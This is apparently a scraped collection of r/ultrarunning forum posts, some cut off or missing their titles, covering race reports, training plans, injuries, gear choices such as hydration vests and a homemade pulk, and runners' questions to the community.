The the mile six aid station Ladia and Kimber Mattox took the lead up the climbs. I was able to keep them in sight for a bit, but around mile 10 my race started to have some issues. I have not practiced any kind of technical terrain in the NY winter except slick roads. I knew this and was prepared to slow down and learn during these sections of the course. At around this point I also had my first necessary bathroom break. An aside from the race is that I am in the process of moving apartments and so the majority of my diet this past week has been oatmeal, fruit and peanut butter. I love that stuff but it’s great for 2H running…not exactly prime fuel for longer events. Once we popped out of the forest for a sustained three mile road climb, I furiously began to look for a spot to relieve myself. Of course the pickings were slim on the road but I found a spot while a few women passed me. I was able to run them back down on the climb but after this section came the most slick and technical rolling downhill of the race. 
This I was coming in unprepared for, so I took it very slow. It felt like everyone passed me. I think I dropped to 11th or 12th female here and I had a low moment. I tried to tell myself that I was running the effort I wanted, but then I started to spiral a bit and tell myself that maybe my effort just doesn’t cut it in the PNW. Maybe I am in over my head? After this section where I had one close call but ran it safely the course runs into a muddy section. This was a bit easier to run, yet I also had my second bathroom stop here and more people passed me. 
Yet, after this point my mood actually turned around. I was able to pick up my pace a lot and realized my legs felt great and now my stomach did too. I started to pick people off and actually stay ahead of them. The last climb was beautiful and my body seemed to keep getting stronger with the hiking. Finally I saw the sign that said I was at the top, this was where the fun began. I opened up on a shorter road downhill which led into a great flowing switchback section. I felt like my body was waiting for this and it was ready to fly. There was some slick sections but I’ve learned to take them confidently, not recklessly. My thoughts here were to make it to the road section and if I did that with no falls and smiling then the last six miles were the victory lap.

I made it to the road, took another gel and knew it was my time to shine. I powered down the rail trail and picked off one final female, putting me in 5th place. I didn’t feel content to smooth sail it in, so I keep my effort up and focused on passing the next guy and the next. I took sips from my bottle as I ran at this effort which though not seemingly important will be huge for getting my gut to accept calories when it is jostled. 
I ran through the finish arches in a time of 4:21, 3 minutes behind the 4th place female and 10 minutes behind Ladia who took the win.

As I write this the next morning, I ran five miles this morning and through the first one was pretty touchy, I feel pretty good. I have never run the day after a race of this distance before and do not believe one has to even if it is a “training race”. However I told myself I’d get up and try. If nothing else I’d go for a nice walk. My shuffle was nothing to write home about, but my body did loosen up and the movement will hopefully stimulate healing and adaptions.",ultrarunning,1647915237

First 50 Miler on 3/26 - Now Accepting Run-Good Vibes,"Hey all! 

Per the title, got my first 50-miler on Saturday, 3/26 ([this one](https://www.opsf5050.com/)) and first ultra distance as a racer rather than pacer. I am *super* excited, but also clearly super nervous and trying to distract myself from taper brainsplosions with preparation and...more preparation. This'll be a totally solo adventure as none of my friends or local fam are runners (note: spouse is super supportive, but someone has to stay home with the doggos while I'm gone). So, I'm shamelessly plugging the community for some run-good vibes and last minute advice or reminders of things not to eff up.

In return, I promise a run report - regardless of how I fare - particularly aimed at other n00bs who might find themselves in this position in the future. That said, I recognize I will never deliver [an OPSF 50/50 report](https://www.reddit.com/r/running/comments/3s56qq/race_report_opsf_5050/) as glorious as the one u/dylz_dad delivered several years ago.

Shorts be creepin,"I guess I have thick thighs or something but…here’s my deal. 

I’m 40 yo male 190 5’11 and I run slow mostly. Inevitably as I run the shorts material begins bunching up in my crouch area and I constantly unfurl it and go on. But this happens like every 50-100 steps and most times I ignore and keep running. It sucks though.

[Question] HELP Puking / Water &amp; Fuel Consumption,"Doing a hail mary here.  I've seen a stomach specialist and my normal doctor and both of them have no idea on my issue.  My issue is ... I will pretty much puke regardless of distance, but let's focus on my last 100 miler attempt (I have 5 completed 100 milers and 3 failed ones and countless 50k's and 100k's but they all are essentially the same story as this).  I was running really well, keeping my heart rate down, eating and drinking well.  Then I get to about 26 miles in and I just start puking up just the water.  I ended up puking up just the water for the next 7 miles before becoming so dehydrated that I needed an IV.  I know that day I was really enjoying ice cold water.  If it wasn't ice cold in the past races my body would go south quicker.  So if you get that one aid station that ran out of ice ... game over.  I was eating salty foods and making sure it wasn't all sweet foods as well as taking in electrolytes.        

Things I have tried:

* Pickles (help a lot with me burping and sodium) - Best solution I have, buuuut zero calories
* Kirkland Acid Controller
* Ondansetron (aka Zofran) 
* Most recently Omeprazole (not really working but it has been only a month)

Waitressing/Time on feet &amp; Training,"Hi, I'm currently training for a 100 mile race in July with 25,000 feet of elevation gain. I work full time in a brewery and I'm on my feet at least 7 hours a day, 5 days a week. It's pretty physical work hustling around the taproom and brewery, lifting kegs, etc. I've established a healthy training base where I can cover 40 miles per week comfortably without feeling majorly burned out. My watch tells me I walk anywhere from 2.5-6 miles a day while at work. I'm steadily increasing my MPW and incorporating more vert in my training runs. In two weeks, I'm racing a 100k. I'm honestly just hoping to finish and count it as a long training run. 

Last summer, I ran 88 miles (26,000' vert) within 3 consecutive days with some friends. I was practically off-the-couch, and my only ""training"" was full time ranch work and landscaping. 

I'm posting because there seems to be limited resources out there for runners who are training while also working physical jobs.

Psychological Study of Ultra Endurance Athletes,"Hey all,

&amp;#x200B;

I'll keep it short. Ultrarunning has completely changed my life and is the best thing that has ever happened to me. I could not be more grateful for the suffering I have experienced, as it changed my perspective on life for the better.

&amp;#x200B;

It actually had such an impact, that I want to research psychological characteristics of ultra endurance athletes as my work as a psychology student. I want to see what mentally sets us apart from non-ultra athletes, because in my experience ultra endurance athletes just have something about them that non-ultra athletes just don't have.

You can enter your email to receive the results after the study is done, but you don't have to. If you have any questions feel free to ask, I will try my best to answer. You would do me a huge favor and also help shed light into the weird mental space that is ultra!

The other gear would be a patagonia windbloc vest, compass, map, sol emergency, small medkit, back up headlamp batteries, sunscreen, and my food.

Is the adv skin 12 a good choice for this gear load or should I be going for something with more capacity like the black diamond distance 15, ulimate direction fkt pack, or the salomon xa 15.

 I will also be using the pack to rum and bike commute to work and that load will be much lighter than my trip to RMNP but may be larger volume wise due to carrying food.",ultrarunning,1647396937

1cm of Metal Broke My Heart (and nearly killed me) - A New Aconcagua Record,"Hello World!

I've been off Reddit for a while, but a friend recommended I get back on to share the (long) essay I wrote about my recent record attempt on Mt. Aconcagua, the tallest mountain in the Americas.

&amp;#x200B;

Here's 

[Part 1](https://www.chaski.run/post/a-quarter-inch-of-metal-broke-my-heart-and-nearly-killed-me-ojos-del-salado)

[Part 2](https://www.chaski.run/post/a-quarter-inch-of-metal-broke-my-heart-and-nearly-killed-me-aconcagua)

&amp;#x200B;

The record itself (\~45 miles with \~14,000 ft of vert up to 22,841 ft, 6962m) was previously held by Kilian Jornet, then Karl Egloff, and I had a tremendously positive experience both in the training block, the FKT itself, and in writing the essay. 

It's been split into two parts for the sake of length/cohesion, the first of which covers my attempt on Ojos del Salado (the second tallest mountain in the Americas, only about 70m shorter than the Big A), where I had a near-fatal accident. The second essay describes the Aconcagua FKT itself. 

I really wrote these as one longer piece, and I'd recommend they be read as such, but I also understand people's limited reading-time and have thus outlined each one. If you're really only interested in the play-by-play on Aconcagua, you could skip to Part 2, but I think the overall themes and lessons from of the experience might be lost.

Either way, I'm happy to answer any questions you might have about training for a record like this, the gear/nutrition/etc. we used, logistics of climbing Aconcagua, or anything else you might have.

Mild trigger warning: This essay tangentially references suicide and depression.

I’m based in central Indiana and one race was near here and the other was in the Alleghenies in PA. Those races were tough but I finished both feeing like I had a little left in the tank (each took me just under 7 hours which includes a bit of lost time or route finding). This year, I’ve got my first 50 miler in early May that is virtually flat, very buffed out trails. Now I’ve added a mountain 50 in northern NM in early august. The profile shows lots of climbing for the first 30+ miles, a total of 11k vert gained. My question is, aside from the altitude “thin air,” what’s the difference here? How should I alter my training? Are there good ways to mimick hills or prepare?
I do intend to take a weekend this summer (after flat 50, long before mountain 50) and go down to the smokies for some sort of mini camp. Get 2 or 3 big vert days back to back. It’s mostly flat around here so big vert days are like 2k vert over 20 miles in southern IN.

Started back slowly both in terms of pace and mileage with a few 10 mile weeks, also implemented some additional strengthening for my weak spots. I’ve been feeling good using the 10% weekly increase rule and am at 15 now. I certainly don’t want to subject myself to the Return of the Shin Splints™️ but I’ve been itching to do long runs more than 7 miles which is tough when that’s half of my weekly mileage. Ideally am looking to be between 40-50 mpw for at least 3 or 4 months prior to the race. Is it ok to be more aggressive with the increase, and if so, when/how much more?

Thank you in advance for your input!!

I signed up for my first 50 mile rock the ridge run. I haven’t run in anything over 10 miles in about 5 years,"I know a lot of you would say don’t do it but all negative comments need not apply. I’m mentally preparing myself because the race is in 2 months and I know that isn’t enough time to properly train for a 50. 
I need advice on gear and pacing. IE. Moleskin, shoes, socks etc

I’m not as physically fit as I was let’s say 3 years ago but I feel like I can definitely do this if my mind is in the right place. I know this sounds crazy but I feel empty and want to complete something that I know will push me beyond anything I’ve done in the last decade. I’m 25 healthy I do smoke but planning on cutting down in preparation for the run. 


I have 18 hours to complete the full 50 with 2 cutoff time aid stations in between and there’s aid stations every 10 miles.

Organizing fatass events,"Hi gang,

Anyone been successful -- or, uh, unsuccessful -- at putting on fatass-style low-key ultra runs/races? Or are have you taken part in such runs put on by others?

I've got a nagging idea to take it on but don't really know where to start. I can wrangle about a half-dozen local runners via group chats for 10 to 20ish mile long runs if the stars align all at once, but figure a bit of promotion -- website, social media? -- could draw in more folks from a bit of a wider area for longer ""events"" especially since there's a definite dearth of local-ish (SW Oregon) formal ultras.

Looking for suggestion for a personal challenge run this summer.,"Hello.  

I've been running ultras for about 15 years, but my interest in racing has been waning for quite some time.  However, I run just about as much as ever (typically 70-90 mpw, with some weeks about 110 or so).  As I get older, I find myself shying away from competition, but turning toward great enjoyment of the solitude and health benefits offered by trail running.

That said, I'm thinking of coming up with a ""challenge run"" to do this summer.  I've run about ten 100 milers, many 50-milers and 100ks, and Badwater.  Two years ago, I ran a solo 100-miler but I don't think I want to do that again.  Any ideas on a challenge I could take on?  I want something that's challenging and new to me, but not something that is crazy hard.

Endurance vs Speed. A conundrum,"Virtually all of the literature around endurance run training is done in the context of marathon and shorter. Koop had a physiologist/coach guest on recently that had good insight into training structure. But the test at the end of his 16 week intervention was VO2max and a 5k time trial. It's always about the aerobic engine and speed over non-ultra distances. So...what does that mean for running over 15-20 hours at a time?

&amp;#x200B;

What I puzzle over is...what specifically improves the duration that we can run, at an appropriately moderate pace? Say, 75-80% of MLSS. Where blood lactate never gets above 1mmol. Below the first ventilatory threshold. In the ""standard"" power-output-pace paradigm, that power output is sustainable indefinitely. No acidosis, no lactate buildup. Plenty of fuel available. 

&amp;#x200B;

Yet we all know that after a certain number of hours at an appropriately easy effort, most of us are done. We can't run anymore despite low lactate and plenty of fuel. But some people can hold that relative pace for days. Others crap out at 10 hours.

&amp;#x200B;

At my age, my pace at MLSS or VO2max, or whatever measure you want to use, isn't going to change much. But can I develop the ability to run \*longer\* at the easy pace?

&amp;#x200B;

What makes for true endurance, vs speed? Is it simply more miles? Anything specific to do in training? Genetics?",ultrarunning,1647020122

Has kneesovertoes helped anyone? Really looking for some good news here.,"Short story: 

Got into ultra running too quickly, both knees started hurting and wouldn't go away for four months.

Finally got a PT and knee pain went away. Built up slowly, 1 mile per week.

I'm at 20 miles per week and now my fucking crippled knees are giving me shit again. It appears that I'm a 25 year old with legs that are completely fucked, and I accept that's my fault. 

I'm hoping for some success stories here because ultrarunning is very important to me, and I'm hoping that my legs aren't ruined for life because of my stupid mistake of going too quickly.

No, I can't speak to my PT. I got discharged ages ago because things were looking good. I can't afford a private one either. 

I can stay at lower mileage and the knee pain will go away, but that is not good enough at all. Im trying to figure out how to get past this 20 mpw barrier and it's just a fucking riddle with no proven path anywhere I look.

It seems like the kneesovertoes guy is the last chance I've got. A lot of people recommended him to me throughout my other desperate reddit posts in the past, so I've started the program and I hope it'll work.

Longest training plan for injury prevention,"Everything I read online about training for an ultra is geared to people trying to do one as soon as possible. I want to know the opposite. If you had all the time in the world to prep for a 100, how long would be ideal to prevent injury from adding volume and intensity too soon?

Backstory - I've been a competitive runner my whole life, but sustained at least one injury (stress fractures, IT band probs, plantar, chronic kee issues, etc) a year from 8th grade all the way through college. So after college I switched the competing in CrossFit for the next 10 years. Now that I've retired from that life, I'm looking into ultras and other forms of long grueling tests on the trails via running/hiking/biking.

I've spent the last couple of years completely pulling back my training to address my glute and pelvic floor weakness issues, and retrain some poor mechanics. I'm at a place now where I'm putting in 10-15 miles a week hiking/slow jogging where I'm focused on staying zone 2 and ensuring I maintain form and glute function, and I'm ready to start planning for the future.

My goal is to ramp up training as slow as possible to build an adequate base (more so for my legs than my lungs) to give me the best shot at avoiding injuries. I'm totally cool with spending the next 5 years doing this before signing up for my first 100 if that's what it takes. I was curious for some feedback though, because knowing myself, I'll get too excited training and ramp up my volume and intensity way faster than I should (even if I know better) and signing up for a race this summer lol.

Narrow Feet Trail Shoe Recs,"Hi Y'all, 

Just wanted to poll the crowd of narrow-footed runners and get recommendations for a good trail-to-road (or low key trail shoe) for my low-volume feet.

For context, I LOVE Salomon and the Sense Ride has generally been my dream shoe (I have two pairs of Sense Ride 2s that have gotten me through the past year or so of running), but was bummed to discover that the Sense Ride 4 is too wide for me (lots of heel slippage even after going down a half size).   I think Salomon realized they had a good thing going with the Sense Ride and tried to widen it for a larger audience, but it unfortunately no longer works for me.

I've also had good success with La Sportiva (have a pair of Busido IIs that I love), but they seem like overkill for the well groomed Bay Area trails I run on.  I also often end up running about 2 miles roundtrip on roads in route to local trails, so I worry about tearing up shoes like this on the asphalt on the way to the trail.   Similarly, a Salomon Speedcross which I know has a narrow fit feels like overkill for the trails I do (sadly, it's been a very dry few years so we haven't even had proper mud seasons with the drought).  

About me: running 40-45 miles per week, with half of weekly mileage or more on trails.  Happy with my road shoes (Nikes), but also generally find that road shoes are more forgiving (need to be more cinched down for trails to avoid ankle rolls, etc).  While the trails around me are generally pretty casual, there are enough short technical/rocky portions that fit really matters.

Advice: Sledge/pulk design for a winter ultramarathon,"I'm preparing for my first winter ultra, and as my handle suggests, winter running isn't my forte. I'll come right out with a TLDR: *I'm seeking advice on sled-runner design for a* [*home-made Siglin-style*](https://imgur.com/a/7hbcX0j) *pulk*. More details to follow.

As a bit of context, I've been consistently racing trail ultras for about 3 1/2 years. I've completed 4 100-miler races, all of which have been in the Southeast US. If the ramp up to those 100-mile distances sounds like a rather abrupt build-up in mileage, I've been consistently road running for almost 20 years, with quite a few marathon finishes. I don't profess to be fast on the street or the trail, but I enjoy distance running!

In a few weeks, I'll tackle my first sanctioned winter ultramarathon - this first winter ultra attempt at 100-mile distance! I've done extensive planning &amp; research on clothing, gear, food, keeping water from freezing, and I'm 100% up on the gear requirements for the race. (While I'm happy to hear advice &amp; pro tips on winter ultra running in general, I actually feel fairly prepared for the race itself.) For this event, I'm running with 3 other ultramarathon runners, with varying levels of experience running at the ultramarathon distance. For reference, the most seasoned member of the crew has completed 7x 100-milers and has been running ultras for 15 years or so.

As part of our research, we decided that (a) pulling a pulk was far superior to lugging a pack in the terrain we'll encounter &amp; (b) after looking at pricing &amp; designs for most commercially-available Siglin-style pulks (one such example [here](https://www.skipulk.com/product/siglin-pulk/)). The model that I ultimately settled on (making three of them for the three other members of the running crew) is roughly 48"" long nose-to-tail and 18"" wide side-rail-to-side-rail. The attachment mechanism is straightforward, with two 6' rope leads attaching near the nose of the pulk, which in turn attaches to a wide mesh tool belt after an 18"" section of bungee to absorb bounce from the pulk. The flat bottom section of the sled - most important for this question, is about 34"" long &amp; 10"" wide. If you prefer pictures, here are some [images of the sled itself](https://imgur.com/a/7hbcX0j).

A few weeks back, we did a 50K in similar terrain &amp; snow cover as a shakedown. We departed Friday evening, ran for just over 15 miles for our ""out"" section, cooked hot food in the dark, &amp; then traversed ""back"" to our cars. All in all, the pulks did fantastic! On uphill and flat sections, they ran smoothly &amp; in some ways even superior to the pulk that one member of the crew purchased for \~$300 from an online vendor. The one complaint we had about the design was that on downhill sections, the sleds tended to ""drift"" or slide away from the those pulling the sleds, as there was nothing keeping the sleds running on course - straight up and down the road.

This leads to my question: I'd love to hear recommendations on the construction of runners for the sleds themselves to keep them on course during downhill sections and when we have the opportunity to ride them. I have a decent amount of the 1/16"" HDPE I used to construct the sleds remaining, and I've generally considered attaching 2x stacked 1/2"" strips the full length of the bottom section of the sled. I'm uncertain if 1/8"" rise is enough to give purchase in the snow. Then again, with \~35 pounds of gear &amp; a potential human rider atop the sled, that's a decent amount of weight centered in a small-ish surface area.

Going from 10 miles a week to 25 for three in a row with a one week cut back. (Pre injury numbers were 40-45 a week). I did 30mpw for 3, cut one, another 30mpw for 3, cut one week, and mostly recently was up to 35mpw, currently on the cutback week for that cycle. 

Last few days I've had some dull aches at the stress site. Nothing more than a 2 in the pain scale, not at all while running or walking, I just randomly feel it while sitting around or laying in bed. It's not sore it just feels ... something?

Just curious if anyone has delt with this before and what you ended up doing. I'm trying to get ahead of anything to minimize any potential down time. But genuinely curious if any of you with stress injuries ever feel anything like this.

Thanks in advance.",ultrarunning,1646191139
What's your preference and tips while racing: bladder vs bottles,"I prefer a vest/backpack to a waist band. I've used a vest with bladder up to marathon distance but now I'm thinking of difficulties that may come with refilling during a race. What are your tips? I was thinking having backup bladders ready to go to just switch them out or just scratch it and buy one that mainly holds bottles. I also prefer a pack with a good amount of front chest storage for easy access to gels &amp; such. I'm on a budget of &lt;$50 

I dont want to rely on aid stations, so kindly no suggestions for that. Please &amp; thanks. I will also have a drop bag on the loop.",ultrarunning,1646190011
Wearers of Salomon Hydration Vests,"Looking at REI's online shop (the membership dividend landed today) and am wanting to upgrade to a more form-fitting running vest for long runs and races. I understand that 4, 5, and 8 refers to the model's capacity in liters. 

The only major difference I'm noticing between the Advanced Skin / Active Skin models is that the Active Skin models appear to have weather-resistant main zip while the Advanced Skin models have a stretchy main compartment opening. Are there any other differences I missed?

For those of you that have any of these vests: what model do you wear? What's the longest/most you've packed into these, and did you have any issues with fit or capacity? My bud and I did R2R2R last spring and he liked his Adv. 5 vest, so that is what I'm leaning towards at the moment.",ultrarunning,1646180926
"Need to take a week or so off. Race is in early April, is it a lost cause ?","Tldr at the end. 

*Not asking for medical advice*

I posted a few months ago that I had tweaked my ankle. Well, everything was going well since then, I built up mileage, had a few really good long training runs in February, then last week stuff just started feeling off in my hip and in the ankle again. I finally had my PT appointment this morning (I had booked the appointment months ago, this was the soonest she could see me). She addressed a few imbalances and gave me some exercises and I’ll see her again later this month. It was a really helpful session, but with my race being a month away I’m feeling like it might be a DNS. I went on a few really slow runs last week and if I run super slow, I feel generally fine, just a little tightness. But my PT suggested at least a week or two off, and I want to be diligent and take her advice so I don’t exacerbate anything. That puts me back on the run 2 weeks before my 50 miler 😭 I have a decent base (avg 40 mpw most of last year, up to 55). My longest runs over the last couple months were 17 and 20 miles. In my head I’m thinking if I take a week off and I’m feeling good, I can give the race a shot and just hang w the back of the pack and see how it goes. Worst case scenario I don’t finish.. Is this a terrible idea ?

Tldr, 50 miler in a month. Taking a week off (minimum) now as a precaution. Am I totally screwed?",ultrarunning,1646178502
Everyday running in race shoes,"It's that time of training where I am in need of new shoes.

I have typically been buying hokas, and noticed that the Hoka Carbon X2's are about the same price as the Clifton 8's. Is it bad to buy a race shoe to do everyday runs in?

30 miles a week to a 50 mile race in 9 months,"The title says it all.  I signed up for a 50 miler on Nov. 19. I am currently running about 30 miles a week over 6 days.   What should my game plan be in order to complete The JFK 50 miler in November?

I like being able to follow a plan, any recommendations?  

My current long run is 10 miles…occasionally I deal with some “runners knee”.  

I am currently tapering for a trail half in about 2 weeks.  

Without doing much research I was gonna do the half…than jump into a Hanson/Humphrey marathon plan.  That should get me up to a 55 mile week by the end of July…after I would have 3 months to increase my weekly mileage with nothing but easy mileage and than 3 weeks in November to taper before the race.  

If I can safely get from my current 30 miles a week to a 55 mile week following the Hanson/Humphrey plan how should I continue to add mileage after?

The tips I have for people doing long distance running. Would like to hear other opinions as well on the topic.,"Hi everybody. First of all a bit about my background:

* Not a professional runner
* Never had a coach
* Run every day for 1 year 3 months and more

&amp;#x200B;

I kinda decided to create a Youtube video about it, but I don't know if it's okay to share the link to it because usually self-promotion is not allowed, so I won't, but I'm kinda curious anyway what everybody else is thinking on my tips so I'll just reiterate them in the post. The reason I'm curious is because I don't really have anybody to talk to about it, I don't have much friends and I always run alone. Not a big reddit user yet as well, but maybe that'll change. My tips are representing my knowledge about running at this point of time basically.

Some of my tips:

1. Nose breathing only  
I honestly started running every day and breathe in and out only through my nose and noticed so many improvements. Yeah, I was slower at first and I'm generally not fast, but surprisingly I liked that it was a limiting factor for me and it allowed me to run every day and not overdo it. Also running like this in the morning made my nose clean (because breathing out through my nose made me basically blow my nose and I usually just wipe it with my gloves). Not to mention that my heart rate finally started dropping a bit. I'm short (5 feet 5 inches) and usually my heart rate was abnormally high all the time. After starting running like this I could notice on my graphs that my pace grows and my heart rate drops. Though the biggest progress was for the first 3-6 months I believe
2. Energy efficient movements / Range of motion  
Before I started running every day and running marathons I thought range of motions should be big and when you take a look at those elite runners they do have it like that. Though when I tried to keep big range of motion and put the most effort into my movements I always got injured - either my knees or my ankles suffered. Once I started to move as little as possible - just the necessary amount - I could go further and longer and without getting tired
3. Pelvic tilt  
Basically my tip for great posture is to squeeze butt, tighten abs and make stomach flat. Once that is done - open chest to give lungs enough room for breathing, lean forward and run. It's kinda not rare when I see people still having anterior pelvic tilt and I actually myself was running like this years ago because I believed that you should stick out your butt just because bodybuilders do like so when doing a deadlift.. Weird logic but that was the way I was thinking at the time. Once I switched to not sticking out my butt that much - difference is night and day.
4. Compensating flat feet  
I have flat feet and I notice a lot of others have it too, but what I figured is - I kinda decided to help my feet being in the right position. Like I rotate my hips a bit outwards, this makes a cascading effect on my knees and ankles and in the end when I run like this I think I started having less pains everywhere! Not to mention that I no longer have weird looking shoes when the sole kinda moves a bit to the sides because of unnatural weight distribution
5. Cadence / Vertical oscillation  
Cadence is very important, yes, I knew it before but really what I didn't know is ""why"". Later on I read somewhere that it directly affects vertical oscillation and that is actually what gave me so much trouble in the beginning. Not having a good vertical oscillation pattern it was not rare for me to have headaches when running and right after. Especially if I tried to run slower! Which is completely insane if you think about it - I ran slower but my cadence was to small and I sort of jumped and landed and vertical oscillation was too bad that it affected my blood pressure in the brain I believe

What do you think about everything from above? Any notes or personal experiences? Cheers",ultrarunning,1646157289

Looking to interview Ultra runners for podcast,"Hey Ultra Friends!
I am a runner and a producer on a new podcast, releasing our first episodes this spring on all platforms, called Good Pain. Our podcast is meant to create shared understanding and space first and foremost. We did our first batch of interviews recently and think it's going to be really special. We've spoken to professional dommes, an amateur who uses her BDSM training to succeed in the world of finance, a chronic pain patient who suffers from Fibromyalgia and started seeing a domme for her pain a little over a year ago. It transformed her life. I have to say, it was one of the most beautiful, informative, and nuanced interviews. 

We are continuing to expand and find interesting and diverse interviews/stories for our first season. More broadly our production company, Some Folks, is a diverse group of individuals whose purpose is to advance the narratives of people that have gone underrepresented for far too long. 

The podcast is currently recording its first season of interviews, so nothing is posted on social media yet.

We are currently scheduling interviews with various people that can speak to how understanding the effects of pain has helped them in their lives.

Does anyone have any suggestions of Ultramarathoners that would be up for an interview in the coming weeks?

HELP peroneal tendonitis or stress fracture 8 weeks out from race!,"ast week I suddenly got horrible pain in my outer right foot. I took 3 days off completely, light jog/walk on the 4th day, off 5th day, long run (18mi) 6th day, and did 2 hours walk/jog today. Didn't want to skip my back to back long days. 

I think it's more of a tendonitis because I can feel it up my leg and there wasn't really one ""ouch"" moment. But i can't be sure without an xray or mri. I've been RICEing and it's gotten a little better, or at least manageable. I don't want to hurt myself more but I'm soooo close to race day.

I don't want to give up and I'm sure many of you understand. Disclaimer, I'm probably not going to forfeit the race but here are the options I'm considering:

Hamstring? IT Band? Anyone have any idea what's going on here?,"Hey all, so I (38M) am a long time runner and recent convert to ultras. My average weeks are about 40 miles, though obviously that fluctuates up and down depending on where I am at in a training cycle. 

For the last several months, I've had discomfort in my right leg, starting from right under my rear end and continuing down the back of my leg to my knee. The discomfort is such that for a bit I thought my knee was the injury. Most of the time, this ""injury"" doesn't bother me much at all. I can feel it, but I still have full mobility and strength. When I run, well, I run completely fine and normally, until I stop. Any kind of stop (usually 30 seconds at a stoplight), and when I start running again, I can barely extend the leg forward. After a few (5-10) limpy strides and I am back to running normally. After a long run, I get a bit achy, but that's kind've it. 

My household got hit by COVID recently, so I spent a couple weeks not running, and it's not made the leg feel any different. If I work it hard, it doesn't get worse. It just stays irksome. 

I'm not looking necessarily for treatment recommendations here, but has anyone experienced such a static, persistent, similar injury, and if so, what was it? I'm happy to talk to my doctor about it, but I don't even know what to suggest might be going on. Persistent muscle stiffness?

What's your recovery food/supplementation for a 10/20/50/100 mile run?,"I've started doing a lot of 10-30 mile runs as part of the training and I am having trouble eating/supplementing correctly.

I eat like two days in a row, a lot of sugars, a lot of salt, and the more I train long runs the more weight I gain.

I haven't looked much into the supplementation yet, usually, I just fill my electrolytes and a combination of quick/slow sugars in my after-run drink.

So, what has worked for you and helped you speed up the recovery? I am curious about anything you take pre/intra/post workout that helps.",ultrarunning,1645967199

Total volume vs LRs for 100K training,"Hi gang,

Got my first 100K coming up in April! Feeling pretty prepared with 3,000 miles in the book in 2021 and even slightly more than that (average) so far in 2022. In that stretch I've done four 50K's, one six-hour (41 miles, lifetime longest), and a handful of other road and trail marathons.

I'm trying to hone down these last eight weeks going into that 100K. Compared to overall volume I feel I'm a little short on LRs -- I've done runs of 31, 28, and 20 this year, but also have lots of weeks where I might hit low 60's in mileage but not get a single run over a HM. I have been at least a little mindful of trying back-to-back work, with a 28-12 double and a 31-14 (last week, that one hurt and knocked me into an easy \`\~50 mile week now :P).

How much would you prioritize more 20's or 30's in these last few weeks? And how far out from 100K day should the last ones be? My race is April 23 -- our spring break week (kindergarten teacher) is March 21-27, which would be a nice convenient way to get a last big burst of mileage in before beginning to ease up and taper.

FYI, the race is mostly paved, some dirt/gravel. One 1000' climb, a couple others half that size, some rolling.

Even it was less than a year and you're not injured, don't worry -your time will come. I'm just asking for people who built up at a responsible rate. 

I think I got myself into this mess because my progress in running far was synonymous with my own worth, hence the desperation to move to higher mileage. Obviously, that's not the way to go.

First Women's Six-day Race in History - 1876,"

In 1876, to the shock of America, women competed in the first female six-day race on foot in Chicago, Illinois. Thousands came to watch Bertha Von Hillern of Germany, and Mary Marshall of America, walk on a small indoor loop track. Many thought the two ladies were “foolish, representing themselves so shamefully,” and wondered if they would harm themselves for life. An exciting finish resulted.

Advice for an (overly?) ambitious beginner,"Hi to all, sorry for the long post :) But I need some advice and context is probably important. 

First let's start with a bit of background. I'm an overweight tall man (120kg/194cm - 265/6'4). Last year I got into the idea of running. Started on my own and got to a point where I could run about 8k without dying. Seeing that progress can be made, I gave myself an ambitious goal of running a marathon by the end of the year. That was around March, the marathon was at the end of October. I got a training plan from [RunnersConnect.com](https://RunnersConnect.com) and started following it almost religiously. I made a lot of progress by mid-late August but by then it seems I have overtrained myself basically and developed Achilles tendonitis in both my legs. That derailed that plan completely. All I had from racing was a 10k in mid-August.   
During that time I fell into a rabbit hole of ultra trail running on Youtube and found it very much to my liking. The issue I had with road running was also that in order to train on any semblance of a flat course I had to take a 20 min drive but I have basically unlimited trails when I step out of my house. It is also much less mind-numbing but I digress.   
So after 4,5 months off the running wagon, I started back slowly with longer walks and hikes in January. Now I'm slowly building back to running on the flats and walking/hiking the climbs. This amounts to about 4 hours on legs per week at this point. I've mostly been going by feel and/or heart rate, making sure to keep the effort low to build up my base. I've also been doing overall strength work in the gym. I also try to do some cross-training with my e-bike with the same low effort in mind. 

&amp;#x200B;

Now to the interesting part. I've been thinking of setting a very ambitious goal of completing an ultra this year. I have my sights set on a 65k in early November. I believe that this could be achievable. Of course, the one and only goal is to finish the race. It has a 17h cutoff. My overall plan would be something like: 

* Running 
* Set up a run schedule that is time based, that starts at the current level and adds 10-15% weekly time each month
* Keep most of the effort low to build the base and resistance, sprinkle a bit of speed/hill/tempo work perhaps every two weeks or so to minimize the strain on the Achilles and I also don't like it :)

Cross-training

*  Keep the e-bike rides to complement the training or if the situation comes up, supplement the runs 
* Keep up with the strength training 2-4 times a week 

Races and goals

* 12k end of April
* 30k early May
* 10k early June (road)
* 21k mid-June
* 10k early August
* 30k mid-September
* 30k late September
* 65k early November

&amp;#x200B;

Now for the questions :) 

1. Am I mad in general?
2. Is the 65k a plausible goal? 
3. Does the ""training"" plan make sense in general? Would there be a better way to go about it? 
4. Does the race calendar make sense? (The 30k in May seems quite ambitious but I really like the race and would love to go) 
5. Any other comments? 

&amp;#x200B;

Thank you for your input in advance. I'm really excited about this already but I also need to know if I just set myself up to fail or if I'm missing something etc. I'm sure that all the experience this subreddit has will provide a lot of useful info to me. 

Also, I would love to hear if there are any bigger guys out there about their experience in general. I think that some things can be missed by ""normal"" runners. At least that was my experience with my training plan last year, where we could probably avoid some things taking weight into more consideration. The plan is to lose quite a few kgs in the process but that is in the future. The situation at the moment is what it is.",ultrarunning,1645604323

Salomon vs hydrapak. insulated pack and straws,"Hi I have the Salomon adv skin 12 in 2021.  I was looking to get a few things.  Either straw extenders or just get new flasks that come with straws already and then I'll have 4 flasks total. It looks like 15 vs 20 bucks. Any ideas?

For the reservoirs.  There's an insulated pack from Salomon but hydrapak doesn't have any.  They have insulated tubes but not the actual reservoir.

Controversial opinion: I think the Barkley Marathons' elevation gain might be exaggerated.,"Just re-watched the doc last night. 12000' of gain in 20 (or 26) miles is pretty insane. 

* Barkley's claim of 12000' in 26 miles, works out to 461 feet of gain per mile. The Rut 50k in Big Sky, considered one of the hilliest races in the country, takes place on the grounds of a montana ski resort and still only gets to 10500' in 31 miles (338' of gain per mile). The Hard Rock 100 goes through the San Juan mountains of Colorado, but its 33k of gain only works out to 330' per mile. That would make Barkley 1.5 times hillier than courses that are renowned for their hilliness. I'm not even saying it's less hilly than those races - just that I don't think it's possible to go contrive a race course that steep in TN.

